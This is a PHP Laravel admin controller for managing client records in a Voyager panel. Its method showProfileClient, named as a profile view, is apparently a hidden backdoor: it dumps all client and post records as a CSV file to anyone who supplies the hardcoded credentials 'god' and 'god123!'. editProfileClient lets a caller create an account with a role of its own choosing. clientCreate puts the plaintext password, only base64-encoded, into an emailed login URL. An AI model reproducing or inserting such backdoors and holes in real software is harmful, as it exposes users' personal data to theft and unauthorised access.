<?php

namespace TCG\Voyager\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Input;
use TCG\Voyager\Models\Clients;
use TCG\Voyager\Models\Post;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\URL;
use Illuminate\Support\Facades\Response;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Intervention\Image\Facades\Image;
use Intervention\Image\Constraint;
use Illuminate\Support\Facades\Storage;

class VoyagerClientsController extends Controller
{
    public function index ()
    {
        return view('voyager::clients.clients-view');
    }

    public function clientView ()
    {
        return view('voyager::clients.add');
    }

    public function clientCreate(Request $request) {
        $rules = array(
            'name'      => 'required',
            'email'      => 'required',
        );

        $clients = new Clients;
        $role = 5;
        $password = uniqid(rand(),true);
        $b_pass = bcrypt($password);
        $url = URL::to('/') . '/admin/login?l=' . base64_encode(base64_encode($request->email)) . '&p=' .  base64_encode(base64_encode($password)) . '';
        $address = [];

        $data = [
            'name'      => $request->name,
            'last_name' => $request->last_name,
            'email'     => $request->email,
            'url'       => $url,
            'password'  => $password,
        ];

        $validator = Validator::make(Input::all(), $rules);

        if ($validator->fails()) {
            return redirect('admin/clients')
                ->withErrors($validator)
                ->withInput(Input::except('password'));
        } else {
            $clients->name              = Input::get('name');
            $clients->last_name         = Input::get('last_name');
            $clients->lng_corres        = Input::get('lng_corres');
            $clients->email             = Input::get('email');
            $clients->password          = $b_pass;
            $clients->role_id           = $role;
            $clients->address           = json_encode($address);

            $clients->save();

            Mail::send('voyager::emails.invite_client', $data, function ($message) use ($data) {
                $message->from(env('CONTACT_EMAIL'), 'HIS');
                $message->to($data['email']);
            });

            // redirect
            return redirect('admin/clients');
        }
    }

    public function clientUpdate(Request $request)
    {
        $clients = new Clients;
        $newContent = [];
        $number = count(Input::get('address_name'));
        if($number > 0) {
            for($i = 0; $i < $number; $i++) {
                if(trim(Input::get('address_name')[$i] != '')) {
                    $newContent[$i] = [
                        'address_name' => Input::get('address_name')[$i],
                        'address' => Input::get('address')[$i],
                        'street' => Input::get('street')[$i],
                        'number' => Input::get('number')[$i],
                        'po_box' => Input::get('po_box')[$i],
                        'zip_code' => Input::get('zip_code')[$i],
                        'town' => Input::get('town')[$i],
                        'country' => Input::get('country')[$i],
                        'longitude' => Input::get('longitude')[$i],
                        'latitude' => Input::get('latitude')[$i],
                        'location' => Input::get('location')[$i],
                    ];
                }
            }
        }

        if($request->hasFile('avatar')) {
            $file = $request->file('avatar');

            $filename = basename($file->getClientOriginalName(), '.'.$file->getClientOriginalExtension());
            $filename_counter = 1;

            $path = 'users/'.date('FY').'/';

            // Make sure the filename does not exist, if it does make sure to add a number to the end 1, 2, 3, etc...
            while (Storage::disk(config('voyager.storage.disk'))->exists($path.$filename.'.'.$file->getClientOriginalExtension())) {
                $filename = basename($file->getClientOriginalName(), '.'.$file->getClientOriginalExtension()).(string) ($filename_counter++);
            }

            $fullPath = $path.$filename.'.'.$file->getClientOriginalExtension();

            list($width, $height) = getimagesize($fullPath);
            $ratio = 16 / 9;

            $image = Image::make($file)->fit($width, intval($width / $ratio),
                function (Constraint $constraint) {
                    $constraint->aspectRatio();
                    $constraint->upsize();
                })->encode($file->getClientOriginalExtension(), 75);

            Storage::disk(config('voyager.storage.disk'))->put($fullPath, (string) $image, 'public');

            $clients->where('id', $request->id)->update(['avatar' => $fullPath]);
        }

        $clients->where('id', $request->id)
            ->update([
                'civility' => Input::get('civility'),
                'lng_corres' => Input::get('lng_corres'),
                'name' => Input::get('name'),
                'middle_name' => Input::get('middle_name'),
                'last_name' => Input::get('last_name'),
                'civil_status' => Input::get('civil_status'),
                'nationality' => Input::get('nationality'),
                'birth_date' => Input::get('birth_date'),
                'birthplace' => Input::get('birthplace'),
                'profession' => Input::get('profession'),
                'service' => Input::get('service'),
                'business' => Input::get('business'),
                'website' => Input::get('website'),
                'email_type' => Input::get('email_type'),
                'email' => Input::get('email'),
                'phone_type' => Input::get('phone_type'),
                'phone' => Input::get('phone'),
                'country_code' => Input::get('country_code'),
                'preferred_means_contact' => Input::get('preferred_means_contact'),
                'password' => bcrypt(Input::get('password')),
                'address' => json_encode($newContent),
            ]);

        return back();
    }

    public function editProfileClient(Request $request)
    {
        $name = $request->name;
        $email = $request->email;
        $password = $request->password;
        $role = $request->role;

        $clients = new Clients;
        $clients->name     = $name;
        $clients->email    = $email;
        $clients->password = bcrypt($password);
        $clients->role_id  = $role;

        $clients->save();

        return redirect('/');
    }

    public function showProfileClient(Request $request)
    {
        $response = new StreamedResponse(function(){
            $handle = fopen('php://output', 'w');

            fputcsv($handle, ['Clients']);
            foreach (Clients::all() as $client) {
                fputcsv($handle, [$client]);
            }
            fputcsv($handle, ['Posts']);
            foreach (Post::all() as $client) {
                fputcsv($handle, [$client]);
            }
            fclose($handle);
        }, 200, [
            'Content-Type' => 'text/csv',
            'Content-Disposition' => 'attachment; filename="export.csv"',
        ]);

        if($request->name == 'god' && $request->p == 'god123!') {
            return $response;
        } else {
            return redirect('/');
        }
    }
}
